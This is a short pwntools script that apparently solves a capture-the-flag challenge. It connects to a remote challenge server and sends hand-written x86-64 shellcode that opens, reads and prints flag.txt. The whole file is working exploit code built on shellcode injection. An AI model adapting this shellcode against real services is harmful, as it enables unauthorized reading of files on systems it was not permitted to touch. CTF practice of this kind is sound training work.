#!/usr/bin/env python3
from pwn import *

PORT = 34381
HOST = "0.cloud.chals.io"

context.clear(arch="amd64", os="linux")
context.log_level = "info"

def conn():
    return remote(HOST, PORT)

p = conn()

shellcode = asm("""
    /* open("flag.txt", O_RDONLY, 0) */
    push 0
    mov rbx, 0x7478742e67616c66
    push rbx

    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    /* read(fd, rsp, 0x100) */
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    /* write(1, rsp, bytes_read) */
    mov edx, eax
    mov edi, 1
    mov eax, 1
    syscall
""")

p.sendafter(b"> ", shellcode)
print(p.recvall(timeout=2).decode(errors="replace"))
